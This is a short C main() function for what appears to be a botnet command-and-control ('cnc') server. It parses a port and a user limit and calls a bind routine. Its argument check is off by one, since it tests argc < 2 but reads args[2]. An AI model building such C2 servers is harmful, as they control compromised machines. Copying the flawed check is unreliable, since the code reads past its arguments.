#include "headers/includes.h"

int main(int argc, char *args[]) {
    if (argc < 2) {
        printf("Error: missing parameters\nUsage: %s [cnc-port] [max-cnc-users]\n", args[0]);
        return EXIT_FAILURE;
    } 

    create_and_bind(atoi(args[1]), atoi(args[2]));
    return EXIT_FAILURE;
}